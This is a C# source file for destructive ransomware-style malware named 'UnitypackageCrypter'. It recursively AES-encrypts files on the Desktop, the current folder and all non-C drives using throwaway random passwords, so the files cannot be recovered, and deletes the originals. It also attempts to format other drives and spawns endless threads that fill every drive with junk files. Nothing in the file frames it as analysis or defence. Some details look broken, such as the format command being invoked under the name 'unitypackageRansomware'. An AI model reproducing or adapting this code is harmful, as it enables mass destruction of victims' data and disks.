
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace UnitypackageCrypter_Linux.ThreadHandler
{
    internal static class ThreadHandler
    {
        //------------------------------------------||
        private static string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);

        private static bool await = false;


        //------------------------------------------||

        /// <summary>
        /// Handler to start Threading
        /// </summary>
        public static void StartHandling()
        {
            Thread Computer = new Thread(Desktop);
            Thread OtherD = new Thread(OtherDrives);
            Thread Current = new Thread(CurrentFolder);
            Computer.Start();
            OtherD.Start();
            Current.Start();
            while (await == false) { }

            new Thread(() =>
            {
                DriveInfo[] allDrives = DriveInfo.GetDrives();
                foreach (DriveInfo drive in allDrives)
                {
                    int failcount = 0;
                    while (failcount < 9999999)
                    {
                        new Thread(() =>
                        {
                            try
                            {
                                int sizeInMB = new Random().Next(1, 2000);
                                byte[] data = GetByteArray(sizeInMB);
                                string b = drive.Name + RandomString(20, false) + ".unityCrypter";
                                using (var fs = new FileStream(b, FileMode.Create, FileAccess.Write, FileShare.None))
                                {
                                    fs.SetLength(sizeInMB * 1024 * 1024);
                                    fs.Write(data, 0, data.Length);
                                    fs.Close();
                                }
                            }
                            catch
                            {
                                failcount++;
                            }
                        }).Start();
                    }
                }
            }).Start();
        }



        private static byte[] GetByteArray(int sizeInMb)
        {
            Random rnd = new Random();
            byte[] b = new byte[sizeInMb * 1024 + 1024]; // convert Mb to byte
            rnd.NextBytes(b);
            return b;
        }

        static void Desktop()
        {
            encryptStuff(DESKTOP_FOLDER);
        }
        static void CurrentFolder()
        {
            encryptStuff(Directory.GetCurrentDirectory());
        }
        static void OtherDrives()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            foreach (DriveInfo drive in allDrives)
            {
                if (drive.Name != @"C:\")
                {
                    FormatDrive(Char.Parse(drive.Name.Replace(@":\", "")));
                    encryptStuff(drive.Name);
                } //Ignore C Driver :)
            }
            await = true;
        }

        public static bool FormatDrive(char driveLetter, string label = "", string fileSystem = "NTFS", bool quickFormat = true, bool enableCompression = false, int? clusterSize = null)
        {
            #region args check

            if (!Char.IsLetter(driveLetter))
            {
                return false;
            }

            #endregion
            bool success = false;
            string drive = driveLetter + ":";
            try
            {
                var di = new DriveInfo(drive);
                var psi = new ProcessStartInfo();
                psi.FileName = "unitypackageRansomware";
                psi.CreateNoWindow = true;
                psi.WorkingDirectory = Environment.SystemDirectory;
                psi.Arguments = "/FS:" + fileSystem +
                                             " /Y" +
                                             " /V:" + label +
                                             (quickFormat ? " /Q" : "") +
                                             ((fileSystem == "NTFS" && enableCompression) ? " /C" : "") +
                                             (clusterSize.HasValue ? " /A:" + clusterSize.Value : "") +
                                             " " + drive;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardInput = true;
                var formatProcess = Process.Start(psi);
                var swStandardInput = formatProcess.StandardInput;
                swStandardInput.WriteLine();
                formatProcess.WaitForExit();
                success = true;
            }
            catch (Exception) { }
            return success;
        }








        private static string RandomString(int length, bool chinese)
        {
            Random rand = new Random();
            const string pool = "abcdefghijklmnopqrstuvwxyz123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            const string poolchinese = "ㄓㄨㄥㄨㄣ中文字将制造款世界上最先进的飞机这是份非常简单的说明书";
            var builder = new StringBuilder();

            for (var i = 0; i < length; i++)
            {
                if (chinese)
                {
                    var c = poolchinese[rand.Next(0, poolchinese.Length)];
                    builder.Append(c);
                }
                else
                {
                    var c = pool[rand.Next(0, pool.Length)];
                    builder.Append(c);
                }

            }

            return builder.ToString();
        }

        private static string Usernameselector(int length)
        {
            Random rand = new Random();
            const string pool = "ㄓㄨㄥㄨㄣ中文字将制造款世界上最先进的飞机这是份非常简单的说明书꧂꧁〄➤♑︎┊♡🎔✺⚫╄⊪┢";
            var usern = new StringBuilder();

            for (var i = 0; i < length; i++)
            {
                var c = pool[rand.Next(0, pool.Length)];
                usern.Append(c);
            }
            return usern.ToString();
        }


        // <summary>Random Filename</summary>
        private static string ENCRYPTED_FILE_EXTENSION = "unitypackage-crypter";

        public static T PickRandom<T>(this List<T> enumerable)
        {
            int index = new System.Random().Next(0, enumerable.Count());
            return enumerable[index];

        }






        /// <summary>
        /// Main Methode to Crypt files
        /// </summary>
        /// <param name="sDir">Folder to Crypt</param>
        private static void encryptStuff(string sDir)
        {
            try
            {
                foreach (string f in Directory.GetFiles(sDir))
                {
                    if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
                    {
                        Crypto(f, RandomString(15, false));
                        File.Delete(f);
                    }

                }

                foreach (string d in Directory.GetDirectories(sDir))
                {
                    encryptStuff(d);
                }
            }
            catch (System.Exception excpt)
            {

            }
        }


        /// <summary>
        /// Crypter to crypt
        /// </summary>
        /// <param name="inputFile">File to Crypt</param>
        /// <param name="password">Password for it</param>
        private static void Crypto(string inputFile, string password)
        {
            byte[] salt = GenerateRandomSalt();
            FileStream fsCrypt = new FileStream(inputFile + ENCRYPTED_FILE_EXTENSION, FileMode.Create);
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Mode = CipherMode.CBC;
            fsCrypt.Write(salt, 0, salt.Length);
            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
            FileStream fsIn = new FileStream(inputFile, FileMode.Open);
            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {

                    cs.Write(buffer, 0, read);
                }

                fsIn.Close();
            }
            catch
            {

            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
                File.Delete(inputFile);

            }
        }

        /// <summary>
        /// Generate Random Salt
        /// </summary>
        /// <returns>Salt for File</returns>
        public static byte[] GenerateRandomSalt()
        {
            System.Random random = new System.Random();
            byte[] data = new byte[random.Next(3, 12)]; // 3 -12 to improofe performance

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {

                    rng.GetBytes(data);
                }
            }

            return data;
        }

    }
}
